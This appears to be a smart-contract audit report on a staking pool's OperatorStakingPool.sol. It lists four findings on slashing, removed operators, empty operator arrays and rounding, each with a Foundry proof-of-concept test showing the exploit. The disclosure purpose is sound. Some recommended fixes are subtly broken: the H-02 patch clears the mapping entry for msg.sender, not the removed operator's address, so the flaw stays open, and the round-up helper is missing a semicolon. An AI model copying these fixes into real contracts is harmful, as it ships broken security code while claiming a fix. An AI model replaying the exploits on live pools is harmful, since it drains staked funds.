# **[H-01]** - `updateReward` doesn't actually update the slashed reward

# Summary

The `_slashOperators` function should slash the appropriate operator and then call
the `updateReward` function with the updated principal of the operator. However when
updating the reward the `operatorPrincipal` is passed instead of the `updatedPrincipal`
leaving a slashed operator with the same reward amount even after the slashing occurs

In the `OperatorStakingPool.sol` file on `Line 330` you can see the following code.




# Vulnerability details
```javascript
for (uint256 i; i < operators.length; ++i) {
      staker = s_stakers[operators[i]];
      uint224 history = staker.history.latest();
      uint256 operatorPrincipal = uint112(history >> 112);
      uint256 stakerStakedAtTime = uint112(history);
      uint256 slashedAmount =
        principalAmount > operatorPrincipal ? operatorPrincipal : principalAmount;
      uint256 updatedPrincipal = operatorPrincipal - slashedAmount;
      // update the staker's rewards
      s_rewardVault.updateReward(operators[i], operatorPrincipal);
```
The last two lines are where the issue resides.
```
`s_rewardVault.updateReward(operators[i], operatorPrincipal)`

Should theoretically be.

`s_rewardVault.updateReward(operators[i], updatedPrincipal)`

```
# Impact
The following POC shows us a test where an operator gets slashed. We logged the
operators balance before and after getting slashed and have confirmed the attack.

```javascript
function test_OperatorExpectedRewardBeforAndAfterSlashing() public {
    address[] memory slashedOperators = _getSlashableOperators();

    (RewardVault.StakerReward memory operatorRewardsBefore, uint256 unclaimedBaseRewards) =
      s_rewardVault.calculateLatestStakerReward(OPERATOR_STAKER_ONE);

    uint256 finalizedBaseRewards = operatorRewardsBefore.finalizedBaseReward;
    uint256 finalizedDelegatedRewards = operatorRewardsBefore.finalizedDelegatedReward;
   
   //logging the first operators reward before slash
   uint operatorAwardBefore = s_rewardVault.getReward(slashedOperators[0]);

   console.log("operatorAwardBefore: %s", operatorAwardBefore);

    changePrank(address(s_pfAlertsController));
    // Slashes the operators
    s_operatorStakingPool.slashAndReward(
      slashedOperators, COMMUNITY_STAKER_ONE, FEED_SLASHABLE_AMOUNT, ALERTER_REWARD_AMOUNT
    );

    //logging the first operators reward after slash
   uint operatorAwardAfter = s_rewardVault.getReward(slashedOperators[0]);
   console.log("operatorAwardAfter: %s", operatorAwardAfter);

  }

Logs:
  operatorAwardBefore: 490339889285879628861
  operatorAwardAfter: 490339889285879628861
```

# Recommended Mitigation Steps

Change `s_rewardVault.updateReward(operators[i], operatorPrincipal)` to `s_rewardVault.updateReward(operators[i], updatedPrincipal)`.



# **[H-02]** - Removed operator can still be slashed

# Summary

The private function `_setSlashableOperators()` is used to set the operators that can be slashed. This is used in the `setSlashableOperators()` function at L380. 

In OperatorStakingPool.sol : L277 : 

function `slashAndReward()`
The comments there say:

```jsx
 /// We will operationally make sure to remove an operator from the slashable (on-feed)
  /// operators list in alerts controllers if they are removed from the operators list in this
  /// contract, so there won't be a case where we slash a removed operator.
```

However, the function used to removeOperators() at L474:

Does not check if the operator is in s_feedSlashableOperators or not. This allows removed operators to be slashed.

# Impact:

The alerter can steal funds from the Operator Staking Pool. However the alerter doesn't call this by himself. He only benefits. So the attacker would be the owner or the slasher who calls the `slashAndReward`.

# Proof of Concept:

The following POC can be run to show that removed operators can be slashed.
The following POC can be run to show that removed operators can be slashed.

```javascript
/// POC for test_RemovedOperatorsCanBeSlashed

function test_RemovedOperatorsCanBeSlashed() public {

    //Deposit Alerter Reward in the Operator Staking Pool
    changePrank(OWNER);
    uint256 amountFunded = 200 ether;
    s_LINK.approve(address(s_operatorStakingPool), 200 ether);
    s_operatorStakingPool.depositAlerterReward(amountFunded);

    address[] memory slashedOperators = _getSlashableOperators();
    
    uint256 balanceOfAlerterBefore = s_LINK.balanceOf(COMMUNITY_STAKER_ONE);
    console.log("Balance of alerter before: ", balanceOfAlerterBefore);
    console.log("Balance of LINK in Operator StakingPool before: ", s_LINK.balanceOf(address(s_operatorStakingPool)));

    //Remove the Operators from the Operators Staking Pool
    changePrank(OWNER);
    s_operatorStakingPool.removeOperators(slashedOperators);
    
    //Slash the removed operators for ALERTER_REWARD_AMOUNT
    changePrank(address(s_pfAlertsController));
    s_operatorStakingPool.slashAndReward(
      slashedOperators, COMMUNITY_STAKER_ONE, FEED_SLASHABLE_AMOUNT, ALERTER_REWARD_AMOUNT
    );

    uint256 balanceOfAlerterAfter = s_LINK.balanceOf(COMMUNITY_STAKER_ONE);
    console.log("Balance of alerter after: ", balanceOfAlerterAfter);
    console.log("Balance of LINK in Operator StakingPool before: ", s_LINK.balanceOf(address(s_operatorStakingPool)));

    assertEq(ALERTER_REWARD_AMOUNT, balanceOfAlerterAfter - balanceOfAlerterBefore);
  }
```

# Recommended Mitigation Steps:
```javascript
function removeOperators(address[] calldata operators)
    external
    onlyRole(DEFAULT_ADMIN_ROLE)
    whenOpen
  {
    Operator storage operator;
    Staker storage staker;
    for (uint256 i; i < operators.length; ++i) {
      address operatorAddress = operators[i];
      operator = s_operators[operatorAddress];
      if (!operator.isOperator) {
        revert OperatorDoesNotExist(operatorAddress);
      }
    // @audit - s_feedSlashableOperators is the mapping which stores the slashavle operators, the address for the 
    // operator should be removed set to zero in the mapping if they are removed as an operator as mentioned at
    // L271. 
			s_feedSlashableOperators[msg.sender] = 0;
      staker = s_stakers[operatorAddress];
      uint224 history = staker.history.latest();
      uint256 principal = uint256(history >> 112);
      uint256 stakedAtTime = uint112(history);
      s_rewardVault.finalizeReward({
        staker: operatorAddress,
        oldPrincipal: principal,
        unstakedAmount: principal,
        shouldClaim: false,
        stakedAt: stakedAtTime
      });

      s_pool.state.totalPrincipal -= principal;
      operator.isOperator = false;
      operator.isRemoved = true;
      // Reset the staker's stakedAtTime to 0 so their multiplier resets to 0.
      _updateStakerHistory({staker: staker, latestPrincipal: 0, latestStakedAtTime: 0});
      // move the operator's staked LINK amount to removedPrincipal that stops earning rewards
      operator.removedPrincipal = principal;

      emit OperatorRemoved(operatorAddress, principal);
    }
```
# **[H-03]** - Alerter can slash the removed operators and steal the alerter reward

### Summary:

Imagine a scenario in which the slashAndReward function is called, and a list of operators, who have already been removed, are passed as an argument (the absence of zero-address check could also be abused here). 

The `slashAndReward()` function does not validates the input but executes the function and transfers the `ALERTER_REWARD_AMOUNT` from the `s_alerterRewardFunds`. The worst part is that `slashAndReward()` can also be called by passing an empty operators array which warrants the need for strict checks on the operators being passed in the input.

### Impact:

The Alerter can steal funds from the Operator Staking Pool.

### Proof of Concept:

```javascript
function test_RemovedOperatorsCanBeSlashed() public {

    //Deposit Alerter Reward in the Operator Staking Pool
    changePrank(OWNER);
    uint256 amountFunded = 200 ether;
    s_LINK.approve(address(s_operatorStakingPool), 200 ether);
    s_operatorStakingPool.depositAlerterReward(amountFunded);

    address[] memory slashedOperators = _getSlashableOperators();
    
    uint256 balanceOfAlerterBefore = s_LINK.balanceOf(COMMUNITY_STAKER_ONE);
    console.log("Balance of alerter before: ", balanceOfAlerterBefore);
    console.log("Balance of LINK in Operator StakingPool before: ", s_LINK.balanceOf(address(s_operatorStakingPool)));

    //Remove the Operators from the Operators Staking Pool
    changePrank(OWNER);
    s_operatorStakingPool.removeOperators(slashedOperators);
    
    //Slash the removed operators for ALERTER_REWARD_AMOUNT
    changePrank(address(s_pfAlertsController));
    s_operatorStakingPool.slashAndReward(
      slashedOperators, COMMUNITY_STAKER_ONE, FEED_SLASHABLE_AMOUNT, ALERTER_REWARD_AMOUNT
    );

    uint256 balanceOfAlerterAfter = s_LINK.balanceOf(COMMUNITY_STAKER_ONE);
    console.log("Balance of alerter after: ", balanceOfAlerterAfter);
    console.log("Balance of LINK in Operator StakingPool before: ", s_LINK.balanceOf(address(s_operatorStakingPool)));

    assertEq(ALERTER_REWARD_AMOUNT, balanceOfAlerterAfter - balanceOfAlerterBefore);
  }

/// POC for Case #2 - Passing Empty Operator Array

function test_EmptyOperatorListCanBeSlashed() public {
    
    //Deposit Alerter Reward in the Operator Staking Pool
    changePrank(OWNER);
    uint256 amountFunded = 200 ether;
    s_LINK.approve(address(s_operatorStakingPool), 200 ether);
    s_operatorStakingPool.depositAlerterReward(amountFunded);

    //Define an empty array of Operators
    address[] memory slashedOperators = new address[](0);
    uint256 balanceOfAlerterBefore = s_LINK.balanceOf(address(COMMUNITY_STAKER_ONE));
    console.log("Balance of alerter before: ", balanceOfAlerterBefore);
    console.log("Balance of LINK in Operator StakingPool before: ", s_LINK.balanceOf(address(s_operatorStakingPool)));

    //Slash the empty operators for ALERTER_REWARD_AMOUNT
    changePrank(address(s_pfAlertsController));
    s_operatorStakingPool.slashAndReward(
      slashedOperators, COMMUNITY_STAKER_ONE, FEED_SLASHABLE_AMOUNT, ALERTER_REWARD_AMOUNT
    );

    uint256 balanceOfAlerterAfter = s_LINK.balanceOf(address(COMMUNITY_STAKER_ONE));
    console.log("Balance of alerter before: ", balanceOfAlerterAfter);
    console.log("Balance of LINK in Operator StakingPool after: ", s_LINK.balanceOf(address(s_operatorStakingPool)));
    
    assertEq(ALERTER_REWARD_AMOUNT, balanceOfAlerterAfter - balanceOfAlerterBefore);
  }
```

### Recommended Mitigation Steps:

Validate the input parameters for the slashAndReward function and add proper checks to ensure that the operators:
1. Aren't removed.
2. Aren't already slashed.
3. Array isn't empty.




# **[M-01]** - Precision loss 'slashAndReward()' leads to leaked value for the protocol

# Summary:

In the given formula, the variable principalAmount is susceptible to precision
loss. When this value is passed to the slashOperators function to deduct from
the operators, this loss in precision could result in the value becoming zero.
Consequently, the rewards might not be updated appropriately.

# Impact:

Stakers might evade the slashing mechanism, leading to a potential loss of
funds for the protocol. This is concerning, especially since the alerter's
compensation is derived from the slashed amount.

# Proof of Concept:

`slashAndReward` calls `_getRemainingSlashCapacity`

```javascript
function _getRemainingSlashCapacity(
    SlasherConfig memory slasherConfig,
    address slasher
  ) private view returns (uint256) {
    SlasherState memory slasherState = s_slasherState[slasher];
    uint256 refilledAmount =
      (block.timestamp - slasherState.lastSlashTimestamp) * slasherConfig.refillRate;

    return Math.min(
      slasherConfig.slashCapacity, slasherState.remainingSlashCapacityAmount + refilledAmount
    );
  }
```

The average block time is roughly 12-15 seconds. 
However, it's important to note that this is an average, and there can be 
variability.

If you're subtracting `slasherState.lastSlashTimestamp` from `block.timestamp`, 
The smallest this number can be is theoretically 1 second, assuming the previous 
transaction was mined in the previous block and the next transaction 
(with the subtraction) is mined in the very next block.

However, in practice, due to the average block time being around 12 seconds, 
the difference would typically be at least 12 seconds or more. But remember, 
it's not guaranteed to be exactly 12 seconds due to the probabilistic nature 
of block mining.

Given the function `_getRemainingSlashCapacity`, the refilledAmount is calculated based on the difference 
between the current block.timestamp and the slasherState.lastSlashTimestamp multiplied by the slasherConfig.refillRate.

If the refillRate is 1 ETH and considering the smallest time difference between 
blocks (as discussed earlier, it can be as low as 1 second in theory but 
typically around 12 seconds), the smallest refilledAmount can be:

For a 1-second difference:

`refilledAmount = 1 * 1 = 1`

For a typical 12-second difference:

`refilledAmount = 12 * 1 = 12`

So, the smallest refilled amount can be 1 if there's a 1-second difference 
between the current block timestamp and the lastSlashTimestamp. However, 
in practice, it would typically be 12 for a 12-second block time.

We can see here that `slashAndReward` determines the amount slashed here.

```solidity
if (combinedSlashAmount > remainingSlashCapacity) {
      /// @dev If a slashing occurs with an amount to be slashed that is higher than the remaining
      /// slashing capacity, only an amount equal to the remaining capacity is slashed.
      //@audit -precision loss here
      principalAmount = remainingSlashCapacity / stakers.length;
    }
```

If the remainingSlashCapacity is low, as we've shown is possible above,
the principalAmount will be round down to zero. Leaving the operators unslashableand causing the alerter to remove rewards.

Consider the following example: 
```
//remainingSlashCapacity = 12
// stakers length = 15
// principalAmount = 12 / 15 = 0 
```
Though the likelihood of this occurring is low it is possible if the remainingSlashCapacity
is small. Leading to rounding to zero.


### Recommended Mitigation Steps:

The easiest fix is to create a function that always rounds up. 

```javascript
/**
     * @param a numerator
     * @param b denominator
     * @dev Division, rounded up
     */
    function roundUpDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        return (a - 1) / b + 1
    }
```
